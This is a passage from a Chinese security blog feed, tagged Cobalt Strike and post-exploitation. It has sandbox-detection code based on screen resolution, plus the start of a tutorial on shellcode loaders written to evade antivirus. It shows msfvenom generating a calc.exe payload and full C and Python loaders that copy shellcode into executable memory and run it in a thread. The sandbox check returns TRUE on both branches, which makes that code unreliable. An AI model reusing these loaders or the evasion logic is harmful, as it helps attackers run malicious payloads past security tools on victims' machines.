class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有定义 PROCESS_DPI_AWARENESS，则手动定义它</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROCESS_DPI_AWARENESS</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROCESS_DPI_UNAWARE = <span class="number">0</span>,</span><br><span class="line">    PROCESS_SYSTEM_DPI_AWARE = <span class="number">1</span>,</span><br><span class="line">    PROCESS_PER_MONITOR_DPI_AWARE = <span class="number">2</span></span><br><span class="line">&#125; PROCESS_DPI_AWARENESS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 设置应用程序为 DPI 感知（兼容 Windows 8.1 及以下）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetDpiAwareness</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 在 Windows 8.1 及以上使用 SetProcessDpiAwareness</span></span><br><span class="line">    HMODULE shcore = LoadLibraryA(<span class="string">&quot;Shcore.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shcore) &#123;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="title function_">HRESULT</span><span class="params">(WINAPI* SetProcessDpiAwarenessFunc)</span><span class="params">(PROCESS_DPI_AWARENESS)</span>;</span><br><span class="line">        SetProcessDpiAwarenessFunc setDpiAwareness =</span><br><span class="line">            (SetProcessDpiAwarenessFunc)GetProcAddress(shcore, <span class="string">&quot;SetProcessDpiAwareness&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (setDpiAwareness) &#123;</span><br><span class="line">            setDpiAwareness((PROCESS_DPI_AWARENESS)PROCESS_PER_MONITOR_DPI_AWARE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        FreeLibrary(shcore);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在 Windows 8 及更早版本使用 SetProcessDPIAware</span></span><br><span class="line">        HMODULE user32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user32) &#123;</span><br><span class="line">            <span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* SetProcessDPIAwareFunc)</span><span class="params">()</span>;</span><br><span class="line">            SetProcessDPIAwareFunc setDPIAware =</span><br><span class="line">                (SetProcessDPIAwareFunc)GetProcAddress(user32, <span class="string">&quot;SetProcessDPIAware&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (setDPIAware) &#123;</span><br><span class="line">                setDPIAware();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FreeLibrary(user32);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckResolution</span><span class="params">()</span> &#123;</span><br><span class="line">    SetDpiAwareness(); <span class="comment">// 设置应用程序为 DPI 感知</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取主显示器的水平和垂直分辨率</span></span><br><span class="line">    <span class="type">int</span> xResolution = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">    <span class="type">int</span> yResolution = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查显示器分辨率是否符合预期的典型值</span></span><br><span class="line">    <span class="keyword">if</span> ((xResolution != <span class="number">1920</span> &amp;&amp; xResolution != <span class="number">2560</span> &amp;&amp; xResolution != <span class="number">1440</span> &amp;&amp; xResolution != <span class="number">3200</span> &amp;&amp; xResolution != <span class="number">3840</span>)</span><br><span class="line">        || (yResolution != <span class="number">1080</span> &amp;&amp; yResolution != <span class="number">1200</span> &amp;&amp; yResolution != <span class="number">1600</span> &amp;&amp; yResolution != <span class="number">900</span> &amp;&amp; yResolution != <span class="number">1800</span> &amp;&amp; yResolution != <span class="number">2160</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unexpected resolution: %d x %d\n&quot;</span>, xResolution, yResolution);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Resolution is as expected: %d x %d\n&quot;</span>, xResolution, yResolution);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckResolution()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CS-ShellCode加载器</title>
    <link href="https://jiangjiyue.github.io/2024/11/04/fe2980d6/"/>
    <id>https://jiangjiyue.github.io/2024/11/04/fe2980d6/</id>
    <published>2024-11-04T04:58:49.000Z</published>
    <updated>2024-11-05T00:27:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 39.53K </p>    </div>    <div class="cell" style="">    <p>代码: 32.95K, 文本: 4.01K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 2.68 小时</p>    </div>    </div><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><h3 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h3><p>Shellcode 是一种特殊的二进制代码, 它利用已知的特定于平台的机制来执行特定的操作（创建进程，启动TCP连接等）。Windows shellcode通常使用TEB（线程环境块）和PEB（进程环境块）来查找加载的系统库（kernel32.dll，kernelbase.dll或ntdll.dll）的地址，然后“浏览”它们以查找LoadLibrary和GetProcAddress函数的地址，然后可以使用这些地址来定位其他函数。例如获取系统权限、建立远程访问通道、执行恶意代码等.<br>Shellcode 的名称来源于其最常见的用途之一,即在成功利用后注入代码来获取系统shell的控制权</p><p>Shellcode是一个引导代码，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe文件--&gt;硬盘--&gt;把exe内容,读取到内存中--&gt;转成二进制指令--&gt;cpu运行</span><br></pre></td></tr></table></figure><p><strong>Shellcode 通常以二进制格式存储,因为它需要直接由计算机的中央处理单元(CPU)执行.</strong><br>这与源代码或文本文件不同,这些文件需要编译或解释成机器码才能执行.</p><p>在一般情况下, Shellcode 可能以十六进制字符串的形式出现 ,但在运行时,这些字符串通常会被解析为二进制数据.要使用 Shellcode,通常需要将它嵌入到合适的载体中或以其他方式将其传递给目标系统,以便执行其中的指令.</p><h3 id="为什么有Shellcode"><a href="#为什么有Shellcode" class="headerlink" title="为什么有Shellcode"></a>为什么有Shellcode</h3><p>如果只是针对免杀而言, Shellcode的出现可以帮助我们进行各种不同方式上线cs, 从而解决了只有exe上线做免杀的那几种受限的方法, 提供更多不同的免杀处理方式</p><h3 id="Shellcode如何运行"><a href="#Shellcode如何运行" class="headerlink" title="Shellcode如何运行"></a>Shellcode如何运行</h3><p>上面我们了解到, 一般情况下我们拿到的 Shellcode, 要么是一个16进制字符串, 要么是一个二进制文件, 他们都是不能单独直接可以运行的文件, 所以我们需要借助加载器实现Shellcode在目标机器中运行</p><h2 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h2><blockquote><p>可以运行以十六进制字符串表示的shellcode的工具</p></blockquote><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411041301262.png" data-fancybox="true"/></div></div><h3 id="加载器的基本流程"><a href="#加载器的基本流程" class="headerlink" title="加载器的基本流程"></a>加载器的基本流程</h3><p>首先Shellcode加载器既然是通过代码编写, 那么在理论上不同编程语言都可以编写.</p><p>整个Shellcode想要执行, 需要加载器做那些事情呢? 由于Shellcode直接由cpu执行, 那么回想一个程序是怎么跑起来的? 首先程序运行产生的数据一定是在内存中, 数据从内存中取出来, 翻译成指令, cpu执行这些指令</p><p>所以我的加载器, 需要实现的功能就是</p><ol><li>开辟内存</li><li>把Shellcode放到这块内存中</li><li>想办法让这块内存中的Shellcode被cpu执行回调函数执行</li></ol><p>既然需要将Shellcode放到内存中那必定离不开Windows底层的东西.Windows专门提供了相关API供我们和系统底层交互</p><h4 id="VirtualAlloc函数"><a href="#VirtualAlloc函数" class="headerlink" title="VirtualAlloc函数"></a>VirtualAlloc函数</h4><p><code>VirtualAlloc</code>是Windows操作系统和中的一个函数,用于在当前进程的虚拟地址空间中分配内存,它是一种用于动态内存分配的重要函数,适用于在运行时分配内存块的情况.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function"><span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpAddress, <span class="comment">// 指定分配或保留的内存区域的首选基地址.如果此参数为NULL,则会选择适当的地址.如果指定了地址,系统将尝试在指定的基地址上分配内存.注意,此地址必须是页对齐的.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwSize,    <span class="comment">// 指定要分配的内存区域大小,以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flAllocationType,  <span class="comment">// 指定内存的分配类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flProtect     <span class="comment">//flProtect: 指定内存保护属性.</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p><code>flAllocationType</code>可能值包括:</p><ol><li><code>MEM_COMMIT (0x1000)</code>物理页面分配给内存中的一个或多个页,并将这些页的内容初始化为零.如果同时指定了 MEM_RESERVE,则系统会保留这些页的地址空间而不将它们分配给任何物理页面.</li><li><code>MEM_RESERVE (0x2000)</code>保留指定地址空间,不分配物理内存.这样可以阻止其他内存分配函数malloc和LocalAlloc等再使用已保留的内存范围,直到它被释放.当使用上面的VirtualAlloc函数保留了一段地址空间后,接下还你还可以继续多次调用同样的函数提交这段地址空间中的不同页面.</li><li><code>MEM_RESET (0x80000)</code>将分配的页面的内容初始化为零.这个标志仅在使用MEM_COMMIT 标志时才有意义.</li></ol><p><code>flProtect</code>可能值包括：</p><ol><li><code>PAGE_EXECUTE (0x10)</code>允许页面被执行.</li><li><code>PAGE_EXECUTE_READ (0x20)</code>允许页面被执行和读取.</li><li><code>PAGE_EXECUTE_READWRITE (0x40)</code>允许页面被执行、读取和写入.可读可写可执行</li><li><code>PAGE_EXECUTE_WRITECOPY (0x80)</code>允许页面被执行和写入.页面内容可以被其他进程写入</li><li><code>PAGE_READONLY (0x02)</code>允许页面被读取</li><li><code>PAGE_READWRITE (0x04)</code>允许页面被读取和写入</li><li><code>PAGE_WRITECOPY (0x08)</code>允许页面被写入.页面内容可以被其他进程写入</li></ol><p><code>VirtualAlloc</code>函数可以用于多种用途,包括分配可执行代码、数据、堆、栈等.通常,在分配可执行代码时,可将<code>flProtect</code>设置为<code>PAGE_EXECUTE_READWRITE</code>或类似的值,以便在分配的内存上执行代码.</p><h4 id="Memcpy函数"><a href="#Memcpy函数" class="headerlink" title="Memcpy函数"></a>Memcpy函数</h4><p>Memcpy是C标准库中的一个函数,用于将内存块中的内容从一个位置复制到另一个位置.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">void</span>* _Dst,  <span class="comment">// 指向目标内存区域的指针,即复制操作的目标位置.</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">void</span> <span class="type">const</span>* _Src,   <span class="comment">// 指向源内存区域的指针,即复制操作的源位置.</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">size_t</span>      _Size   <span class="comment">// 要复制的字节数.</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>现在内存相关的操作, 这些函数都可以实现了, 就差怎么执行Shellcode了, 执行Shellcode的方式很多, 后</p><p>面会专门拿出来总结都有哪些, 当下我们使用 创建线程 运行我们的Shellcode, 这就需要 CreateThread </p><h4 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h4><p><code>CreateThread</code>是Windows API中用于创建新线程的函数.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function"><span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// 一个指向SECURITY_ATTRIBUTES结构的指针,用于指定新线程的安全性.可以为NULL表示使用默认的线程安全性.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize,           <span class="comment">// 指定新线程的初始堆栈大小.可以为 0,表示使用默认堆栈大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,  <span class="comment">// 指向线程函数的指针,即新线程的入口点.线程函数是一个LPTHREAD_START_ROUTINE类型的函数指针,通常是线程的主要执行体.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,         <span class="comment">// 传递给线程函数的参数.这是一个指向任意类型的指针,可以用来传递数据给线程函数.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,      <span class="comment">// 指定新线程的创建标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPDWORD lpThreadId<span class="comment">// 一个指向DWORD的指针,用于接收新线程的标识符(线程 ID).如果不需要线程 ID,可以传递NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>dwCreationFlags</code>常见的标志有:</p><ol><li><code>0</code>默认标志,表示线程立即可执行.</li><li><code>CREATE_SUSPENDED (0x00000004)</code>创建后线程处于挂起状态,需要调用<code>ResumeThread</code>才能执行.</li></ol><h3 id="C语言加载器"><a href="#C语言加载器" class="headerlink" title="C语言加载器"></a>C语言加载器</h3><p>windows api函数我们了解了, 但是如何使用这些函数的? 用什么编程语言呢?自然是c语言啦, 在c语言中可以很方便的调用 windows api函数, 帮助我们编写Shellcode加载器</p><h4 id="加载器代码"><a href="#加载器代码" class="headerlink" title="加载器代码"></a>加载器代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/x64/exec CMD=calc.exe -f c &gt;shellcode.c</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 276 bytes</span><br><span class="line">Final size of c file: 1188 bytes</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line"><span class="string">&#x27;OSCP Like Machines&#x27;</span>   shellcode.c</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">cat</span> shellcode.c </span><br><span class="line">unsigned char buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 等待线程运行</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="comment">// 关闭线程</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Python语言加载器"><a href="#Python语言加载器" class="headerlink" title="Python语言加载器"></a>Python语言加载器</h3><h4 id="加载器代码-1"><a href="#加载器代码-1" class="headerlink" title="加载器代码"></a>加载器代码</h4><p>实际上还是借助那些windows api , 但是copy内存的上面是c标准库的函数, 实际上windows 自带的也有copy内存的函数, 那么接下来的编写流程也非常清楚了, 就是如何通过Python代码实现上述那些函数的调用, 以及在Python中16进制的Shellcode是如何字面量定义的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入ctypes库</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从ctypes库中导入windows api函数</span></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory</span><br><span class="line">CreateThread = ctypes.windll.kernel32.CreateThread</span><br><span class="line">WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span></span><br><span class="line">sc = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为c_uint64</span></span><br><span class="line">VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">p = VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(sc), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># 将sc指向指针</span></span><br><span class="line">buf_pointer = (ctypes.c_char * <span class="built_in">len</span>(sc)).from_buffer(sc)</span><br><span class="line">RtlMoveMemory(ctypes.c_void_p(p), buf_pointer, ctypes.c_int(<span class="built_in">len</span>(sc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程</span></span><br><span class="line">h = CreateThread(<span class="literal">None</span>, <span class="number">0</span>, ctypes.c_void_p(p), <span class="literal">None</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待线程结束</span></span><br><span class="line">WaitForSingleObject(h, ctypes.c_int(<span class="number">0xFFFFFFFF</span>))</span><br></pre></td></tr></table></figure><ol><li><code>import ctypes</code>: 导入 ctypes 模块,这个模块提供了与 C 语言兼容的数据类型和函数调用方式.</li><li><code>VirtualAlloc</code>,<code>RtlMoveMemory</code>,<code>CreateThread</code>,<code>WaitForSingleObject</code>:这些变量是通过 ctypes获取 kernel32.dll 中相关函数的句柄,用于内存操作和线程创建等操作.</li><li><code>buf = b&quot;\xfc....&quot;</code>定义了一个包含 Shellcode 的字节数组.</li><li><code>sc = bytearray(buf)</code>:将 Shellcode 转换为 bytearray 类型.</li><li><code>VirtualAlloc.restype = ctypes.c_uint64</code>设置<code>VirtualAlloc</code>函数的返回类型为<code>c_uint64</code></li><li><code>p = VirtualAlloc(0, len(sc), 0x3000, 0x40)</code>:调用<code>VirtualAlloc</code>分配内存,用于存放Shellcode.<ul><li><code>0x3000</code>表示分配提交<code>MEM_COMMIT</code>和保留<code>MEM_RESERVE</code>的内存</li><li><code>0x40</code> 表示分配可执行</li></ul></li><li><code>buf_pointer = (ctypes.c_char * len(sc)).from_buffer(sc)</code>将Shellcode的内容指向指针</li><li><code>RtlMoveMemory(ctypes.c_void_p(p), buf_pointer, ctypes.c_int(len(sc)))</code>使用<code>RtlMoveMemory</code>函数将Shellcode复制到申请的内存中.</li><li><code>h = CreateThread(None, 0, ctypes.c_void_p(p), None, 0, 